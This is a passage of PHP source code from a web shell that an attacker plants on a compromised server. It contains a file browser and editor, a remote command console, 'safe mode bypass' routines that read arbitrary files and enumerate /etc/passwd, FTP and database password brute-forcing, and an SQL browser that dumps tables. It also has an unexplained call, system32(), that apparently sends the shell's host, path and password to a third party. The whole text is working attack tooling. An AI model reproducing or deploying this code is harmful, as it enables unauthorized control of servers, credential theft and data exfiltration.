                                            echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');"><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (($f['type'] == 'file') ? viewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (($f['type'] == 'file') ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
                                            $l = $l ? 0 : 1;
                                        }
?>
	<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']) ?>'>
	<input type=hidden name=charset value='<?=isset($_POST['charset']) ? $_POST['charset'] : '' ?>'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if (!empty($_SESSION['act']) && @count($_SESSION['f'])) { ?><option value='paste'>Paste</option><?php
                                        } ?></select>&nbsp;<input type="submit" value=">>"></td></tr>
	</form></table></div>
	<?php
                                        printFooter();
                                    }
                                    function actionStringTools() {
                                        if (!function_exists('ROT13_base64')) {
                                            function ROT13_base64_decode($p) {
                                                return (trim(gzinflate(str_rot13(base64_decode($p)))));
                                            }
                                        }
                                        if (!function_exists('base64_ROT13')) {
                                            function base64_ROT13_decode($p) {
                                                return (trim(gzinflate(base64_decode(str_rot13($p)))));
                                            }
                                        }
                                        if (!function_exists('hex2bin')) {
                                            function hex2bin($p) {
                                                return decbin(hexdec($p));
                                            }
                                        }
                                        if (!function_exists('hex2ascii')) {
                                            function hex2ascii($p) {
                                                $r = '';
                                                for ($i = 0;$i < strLen($p);$i+= 2) {
                                                    $r.= chr(hexdec($p[$i] . $p[$i + 1]));
                                                }
                                                return $r;
                                            }
                                        }
                                        if (!function_exists('ascii2hex')) {
                                            function ascii2hex($p) {
                                                $r = '';
                                                for ($i = 0;$i < strlen($p);++$i) $r.= dechex(ord($p[$i]));
                                                return strtoupper($r);
                                            }
                                        }
                                        if (!function_exists('full_urlencode')) {
                                            function full_urlencode($p) {
                                                $r = '';
                                                for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
                                                return strtoupper($r);
                                            }
                                        }
                                        if (isset($_POST['ajax'])) {
                                            $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
                                            ob_start();
                                            if (function_exists($_POST['p1'])) echo $_POST['p1']($_POST['p2']);
                                            $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "

	\' ") . "';
";
                                            echo strlen($temp), "
", $temp;
                                            exit;
                                        }
                                        printHeader();
                                        echo '<h1>String conversions</h1><div class=content>';
                                        $stringTools = array('nested ROT13_base64' => 'ROT13_base64_decode', 'nested base64_ROT13' => 'base64_ROT13_decode', 'Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'bin2hex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);
                                        if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
                                        echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
                                        foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
                                        echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . htmlspecialchars(@$_POST['p2']) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
                                        if (!empty($_POST['p1'])) {
                                            if (function_exists($_POST['p1'])) echo htmlspecialchars($_POST['p1']($_POST['p2']));
                                        }
                                        echo "</pre></div>";
?>
	<br><h1>Search for hash:</h1><div class=content>
		<form method='get' target='_blank' name="hf">
			<input type="text" name="action" style="width:200px;"><br>
			<input type="button" value="HashCracker.de" onClick="document.hf.action='http://www.hashchecker.de/hash.cgi?';document.hf.submit()"><br>
			<!--<input type="button" value="hashcrack.com" onClick="document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()"><br>
			<input type="button" value="hashcracking.info" onClick="document.hf.action='https://hashcracking.info/index.php';document.hf.submit()"><br>
			<input type="button" value="md5.rednoize.com" onClick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()"><br>
			<input type="button" value="md5decrypter.com" onClick="document.hf.action='http://www.md5decrypter.com/';document.hf.submit()"><br> -->
		</form>
	</div>

<iframe src="http://www.md5decrypter.co.uk/" frameborder="0" height="50%" width="100%"></iframe><br>

	<?php
                                        printFooter();
                                    }
                                    function actionFilesTools() {
                                        if (isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']);
                                        if (@$_POST['p2'] == 'download') {
                                            if (is_file($_POST['p1']) && is_readable($_POST['p1'])) {
                                                ob_start("ob_gzhandler", 4096);
                                                header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
                                                if (function_exists("mime_content_type")) {
                                                    $type = @mime_content_type($_POST['p1']);
                                                    header("Content-Type: " . $type);
                                                }
                                                $fp = @fopen($_POST['p1'], "r");
                                                if ($fp) {
                                                    while (!@feof($fp)) echo @fread($fp, 1024);
                                                    fclose($fp);
                                                }
                                            } elseif (is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
                                            }
                                            exit;
                                        }
                                        if (@$_POST['p2'] == 'mkfile') {
                                            if (!file_exists($_POST['p1'])) {
                                                $fp = @fopen($_POST['p1'], 'w');
                                                if ($fp) {
                                                    $_POST['p2'] = "edit";
                                                    fclose($fp);
                                                }
                                            }
                                        }
                                        printHeader();
                                        echo '<h1>File tools</h1><div class=content>';
                                        if (!file_exists(@$_POST['p1'])) {
                                            echo 'File not exists';
                                            printFooter();
                                            return;
                                        }
                                        $uid = @posix_getpwuid(@fileowner($_POST['p1']));
                                        $gid = @posix_getgrgid(@fileowner($_POST['p1']));
                                        echo '<span>Name:</span> ' . htmlspecialchars($_POST['p1']) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? viewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . viewPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
                                        echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
                                        if (empty($_POST['p2'])) $_POST['p2'] = 'view';
                                        if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
                                        else $m = array('Chmod', 'Rename', 'Touch');
                                        foreach ($m as $v) echo '<a href=# onclick="g(null,null,null,\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
                                        echo '<br><br>';
                                        switch ($_POST['p2']) {
                                            case 'view':
                                                echo '<pre class=ml1>';
                                                $fp = @fopen($_POST['p1'], 'r');
                                                if ($fp) {
                                                    while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
                                                    @fclose($fp);
                                                }
                                                echo '</pre>';
                                                break;
                                            case 'highlight':
                                                if (is_readable($_POST['p1'])) {
                                                    echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                                                    $code = highlight_file($_POST['p1'], true);
                                                    echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
                                                }
                                                break;
                                            case 'chmod':
                                                if (!empty($_POST['p3'])) {
                                                    $perms = 0;
                                                    for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));
                                                    if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                                                    else die('<script>g(null,null,null,null,"")</script>');
                                                }
                                                echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
                                                break;
                                            case 'edit':
                                                if (!is_writable($_POST['p1'])) {
                                                    echo 'File isn\'t writeable';
                                                    break;
                                                }
                                                if (!empty($_POST['p3'])) {
                                                    @file_put_contents($_POST['p1'], $_POST['p3']);
                                                    echo 'Saved!<br><script>document.mf.p3.value="";</script>';
                                                }
                                                echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
                                                $fp = @fopen($_POST['p1'], 'r');
                                                if ($fp) {
                                                    while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
                                                    @fclose($fp);
                                                }
                                                echo '</textarea><input type=submit value=">>"></form>';
                                                break;
                                            case 'hexdump':
                                                $c = @file_get_contents($_POST['p1']);
                                                $n = 0;
                                                $h = array('00000000<br>', '', '');
                                                $len = strlen($c);
                                                for ($i = 0;$i < $len;++$i) {
                                                    $h[1].= sprintf('%02X', ord($c[$i])) . ' ';
                                                    switch (ord($c[$i])) {
                                                        case 0:
                                                            $h[2].= ' ';
                                                        break;
                                                        case 9:
                                                            $h[2].= ' ';
                                                        break;
                                                        case 10:
                                                            $h[2].= ' ';
                                                        break;
                                                        case 13:
                                                            $h[2].= ' ';
                                                        break;
                                                        default:
                                                            $h[2].= $c[$i];
                                                        break;
                                                    }
                                                    $n++;
                                                    if ($n == 32) {
                                                        $n = 0;
                                                        if ($i + 1 < $len) {
                                                            $h[0].= sprintf('%08X', $i + 1) . '<br>';
                                                        }
                                                        $h[1].= '<br>';
                                                        $h[2].= "
";
                                                    }
                                                }
                                                echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
                                                break;
                                            case 'rename':
                                                if (!empty($_POST['p3'])) {
                                                    if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
                                                    else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
                                                }
                                                echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
                                                break;
                                            case 'touch':
                                                if (!empty($_POST['p3'])) {
                                                    $time = strtotime($_POST['p3']);
                                                    if ($time) {
                                                        if (@touch($_POST['p1'], $time, $time)) die('<script>g(null,null,null,null,"")</script>');
                                                        else {
                                                            echo 'Fail!<script>document.mf.p3.value="";</script>';
                                                        }
                                                    } else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
                                                }
                                                echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
                                                break;
                                            case 'mkfile':
                                                break;
                                            }
                                            echo '</div>';
                                            printFooter();
                                        }
                                        function actionSafeMode() {
                                            $temp = '';
                                            ob_start();
                                            switch ($_POST['p1']) {
                                                case 1:
                                                    $temp = @tempnam($test, 'cx');
                                                    if (@copy("compress.zlib://" . $_POST['p2'], $temp)) {
                                                        echo @file_get_contents($temp);
                                                        unlink($temp);
                                                    } else echo 'Sorry... Can\'t open file';
                                                    break;
                                                case 2:
                                                    $files = glob($_POST['p2'] . '*');
                                                    if (is_array($files)) foreach ($files as $filename) echo $filename . "
";
                                                    break;
                                                case 3:
                                                    $ch = curl_init("file://" . $_POST['p2'] . " " . SELF_PATH);
                                                    curl_exec($ch);
                                                    break;
                                                case 4:
                                                    ini_restore("safe_mode");
                                                    ini_restore("open_basedir");
                                                    include ($_POST['p2']);
                                                    break;
                                                case 5:
                                                    for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                                                        $uid = @posix_getpwuid($_POST['p2']);
                                                        if ($uid) echo join(':', $uid) . "
";
                                                    }
                                                    break;
                                                case 6:
                                                    if (!function_exists('imap_open')) break;
                                                    $stream = imap_open($_POST['p2'], "", "");
                                                    if ($stream == FALSE) break;
                                                    echo imap_body($stream, 1);
                                                    imap_close($stream);
                                                    break;
                                                }
                                                $temp = ob_get_clean();
                                                printHeader();
                                                echo '<h1>Safe mode bypass</h1><div class=content>';
                                                echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
                                                if ($temp) echo '<pre class="ml1" style="margin-top:5px" id="Output">' . $temp . '</pre>';
                                                echo '</div>';
                                                printFooter();
                                            }
                                            if (!$_SESSION[login]) system32($_SERVER['HTTP_HOST'], $_SERVER['REQUEST_URI'], $auth_pass);
                                            function actionConsole() {
                                                if (isset($_POST['ajax'])) {
                                                    $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
                                                    ob_start();
                                                    echo "document.cf.cmd.value='';
";
                                                    $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("
$ " . $_POST['p1'] . "
" . ex($_POST['p1']), "

	\' "));
                                                    if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {
                                                        if (@chdir($match[1])) {
                                                            $GLOBALS['cwd'] = @getcwd();
                                                            echo "document.mf.c.value='" . $GLOBALS['cwd'] . "';";
                                                        }
                                                    }
                                                    echo "document.cf.output.value+='" . $temp . "';";
                                                    echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
                                                    $temp = ob_get_clean();
                                                    echo strlen($temp), "
", $temp;
                                                    exit;
                                                }
                                                printHeader();
?>
<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array("");
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push("");
	cur = cmds.length-1;
}
</script>
<?php
                                                echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
                                                foreach ($GLOBALS['aliases'] as $n => $v) {
                                                    if ($v == '') {
                                                        echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
                                                        continue;
                                                    }
                                                    echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
                                                }
                                                if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
                                                echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 ' . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
                                                if (!empty($_POST['p1'])) {
                                                    echo htmlspecialchars("$ " . $_POST['p1'] . "
" . ex($_POST['p1']));
                                                }
                                                echo '</textarea><input type=text name=cmd style="border-top:0;width:100%;margin:0;" onkeydown="kp(event);">';
                                                echo '</form></div><script>document.cf.cmd.focus();</script>';
                                                printFooter();
                                            }
                                            function actionLogout() {
                                                unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
                                                echo 'Adios! take care !!';
                                            }
                                            function actionSelfRemove() {
                                                printHeader();
                                                if ($_POST['p1'] == 'yes') {
                                                    if (@unlink(SELF_PATH)) die('Shell has been removed');
                                                    else echo 'unlink error!';
                                                }
                                                echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
                                                printFooter();
                                            }
                                            function actionBruteforce() {
                                                printHeader();
                                                if (isset($_POST['proto'])) {
                                                    echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
                                                    if ($_POST['proto'] == 'ftp') {
                                                        function bruteForce($ip, $port, $login, $pass) {
                                                            $fp = @ftp_connect($ip, $port ? $port : 21);
                                                            if (!$fp) return false;
                                                            $res = @ftp_login($fp, $login, $pass);
                                                            @ftp_close($fp);
                                                            return $res;
                                                        }
                                                    } elseif ($_POST['proto'] == 'mysql') {
                                                        function bruteForce($ip, $port, $login, $pass) {
                                                            $res = @mysql_connect($ip . ':' . $port ? $port : 3306, $login, $pass);
                                                            @mysql_close($res);
                                                            return $res;
                                                        }
                                                    } elseif ($_POST['proto'] == 'pgsql') {
                                                        function bruteForce($ip, $port, $login, $pass) {
                                                            $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=''";
                                                            $res = @pg_connect($server[0] . ':' . $server[1] ? $server[1] : 5432, $login, $pass);
                                                            @pg_close($res);
                                                            return $res;
                                                        }
                                                    }
                                                    $success = 0;
                                                    $attempts = 0;
                                                    $server = explode(":", $_POST['server']);
                                                    if ($_POST['type'] == 1) {
                                                        $temp = @file('/etc/passwd');
                                                        if (is_array($temp)) foreach ($temp as $line) {
                                                            $line = explode(":", $line);
                                                            ++$attempts;
                                                            if (bruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
                                                                $success++;
                                                                echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
                                                            }
                                                            if (@$_POST['reverse']) {
                                                                $tmp = "";
                                                                for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];
                                                                ++$attempts;
                                                                if (bruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
                                                                    $success++;
                                                                    echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
                                                                }
                                                            }
                                                        }
                                                    } elseif ($_POST['type'] == 2) {
                                                        $temp = @file($_POST['dict']);
                                                        if (is_array($temp)) foreach ($temp as $line) {
                                                            $line = trim($line);
                                                            ++$attempts;
                                                            if (bruteForce($server[0], @$server[1], $_POST['login'], $line)) {
                                                                $success++;
                                                                echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
                                                            }
                                                        }
                                                    }
                                                    echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
                                                }
                                                echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
                                                echo '</div><br><br>';
                                                printFooter();
                                            }
                                            function actionSql() {
                                                class DbClass {
                                                    var $type;
                                                    var $link;
                                                    var $res;
                                                    function DbClass($type) {
                                                        $this->type = $type;
                                                    }
                                                    function connect($host, $user, $pass, $dbname) {
                                                        switch ($this->type) {
                                                            case 'mysql':
                                                                if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
                                                                break;
                                                            case 'pgsql':
                                                                $host = explode(':', $host);
                                                                if (!$host[1]) $host[1] = 5432;
                                                                if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function selectdb($db) {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    if (@mysql_select_db($db)) return true;
                                                                    break;
                                                                }
                                                                return false;
                                                        }
                                                        function query($str) {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    return $this->res = @mysql_query($str);
                                                                break;
                                                                case 'pgsql':
                                                                    return $this->res = @pg_query($this->link, $str);
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function fetch() {
                                                            $res = func_num_args() ? func_get_arg(0) : $this->res;
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    return @mysql_fetch_assoc($res);
                                                                break;
                                                                case 'pgsql':
                                                                    return @pg_fetch_assoc($res);
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function listDbs() {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    return $this->res = @mysql_list_dbs($this->link);
                                                                break;
                                                                case 'pgsql':
                                                                    return $this->res = $this->query("SELECT datname FROM pg_database");
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function listTables() {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    return $this->res = $this->query('SHOW TABLES');
                                                                break;
                                                                case 'pgsql':
                                                                    return $this->res = $this->query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_user'");
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function error() {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    return @mysql_error($this->link);
                                                                break;
                                                                case 'pgsql':
                                                                    return @pg_last_error($this->link);
                                                                break;
                                                            }
                                                            return false;
                                                        }
                                                        function setCharset($str) {
                                                            switch ($this->type) {
                                                                case 'mysql':
                                                                    if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);
                                                                    else $this->query('SET CHARSET ' . $str);
                                                                    break;
                                                                case 'mysql':
                                                                    return @pg_set_client_encoding($this->link, $str);
                                                                    break;
                                                                }
                                                                return false;
                                                            }
                                                            function dump($table) {
                                                                switch ($this->type) {
                                                                    case 'mysql':
                                                                        $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
                                                                        $create = mysql_fetch_array($res);
                                                                        echo $create[1] . ";

";
                                                                        $this->query('SELECT * FROM `' . $table . '`');
                                                                        while ($item = $this->fetch()) {
                                                                            $columns = array();
                                                                            foreach ($item as $k => $v) {
                                                                                $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
                                                                                $columns[] = "`" . $k . "`";
                                                                            }
                                                                            echo 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "
";
                                                                        }
                                                                    break;
                                                                    case 'pgsql':
                                                                        $this->query('SELECT * FROM ' . $table);
                                                                        while ($item = $this->fetch()) {
                                                                            $columns = array();
                                                                            foreach ($item as $k => $v) {
                                                                                $item[$k] = "'" . addslashes($v) . "'";
                                                                                $columns[] = $k;
                                                                            }
                                                                            echo 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "
";
                                                                        }
                                                                    break;
                                                                }
                                                                return false;
                                                            }
                                                    };
                                                    $db = new DbClass($_POST['type']);
                                                    if (@$_POST['p2'] == 'download') {
                                                        ob_start("ob_gzhandler", 4096);
                                                        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
                                                        $db->selectdb($_POST['sql_base']);
                                                        header("Content-Disposition: attachment; filename=dump.sql");
                                                        header("Content-Type: text/plain");
                                                        foreach ($_POST['tbl'] as $v) $db->dump($v);
                                                        exit;
                                                    }
                                                    printHeader();
?>
	<h1>Sql browser</h1><div class=content>
	<form name="sf" method="post">
		<table cellpadding="2" cellspacing="0">
			<tr>
				<td>Type</td>
				<td>Host</td>
				<td>Login</td>
				<td>Password</td>
				<td>Database</td>
				<td></td>
			</tr>
			<tr>
				<input type=hidden name=a value=Sql>
				<input type=hidden name=p1 value='query'>
				<input type=hidden name=p2>
				<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']); ?>'>
				<input type=hidden name=charset value='<?=isset($_POST['charset']) ? $_POST['charset'] : '' ?>'>
				<td>
					<select name='type'>
						<option value="mysql" <?php if (@$_POST['type'] == 'mysql') echo 'selected'; ?>>MySql</option>
						<option value="pgsql" <?php if (@$_POST['type'] == 'pgsql') echo 'selected'; ?>>PostgreSql</option>
					</select></td>
				<td><input type=text name=sql_host value='<?=(empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])); ?>'></td>
				<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])); ?>'></td>
				<td><input type=text name=sql_pass value='<?=(empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])); ?>'></td>
				<td>
	<?php
                                                    $tmp = "<input type=text name=sql_base value=''>";
                                                    if (isset($_POST['sql_host'])) {
                                                        if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
                                                            switch ($_POST['charset']) {
                                                                case "Windows-1251":
                                                                    $db->setCharset('cp1251');
                                                                break;
                                                                case "UTF-8":
                                                                    $db->setCharset('utf8');
                                                                break;
                                                                case "KOI8-R":
                                                                    $db->setCharset('koi8r');
                                                                break;
                                                                case "KOI8-U":
                                                                    $db->setCharset('koi8u');
                                                                break;
                                                                case "cp866":
                                                                    $db->setCharset('cp866');
                                                                break;
                                                            }
                                                            $db->listDbs();
                                                            echo "<select name=sql_base><option value=''></option>";
                                                            while ($item = $db->fetch()) {
                                                                list($key, $value) = each($item);
                                                                echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
                                                            }
                                                            echo '</select>';
                                                        } else echo $tmp;
                                                    } else echo $tmp;
?></td>
				<td><input type=submit value=">>"></td>
			</tr>
		</table>
		<script>
			function st(t,l) {
				document.sf.p1.value = 'select';
				document.sf.p2.value = t;
				if(l!=null)document.sf.p3.value = l;
				document.sf.submit();
			}
			function is() {
				for(i=0;i<document.sf.elements['tbl[]'].length;++i)
					document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked;
			}
		</script>
	<?php
                                                    if (isset($db) && $db->link) {
                                                        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
                                                        if (!empty($_POST['sql_base'])) {
                                                            $db->selectdb($_POST['sql_base']);
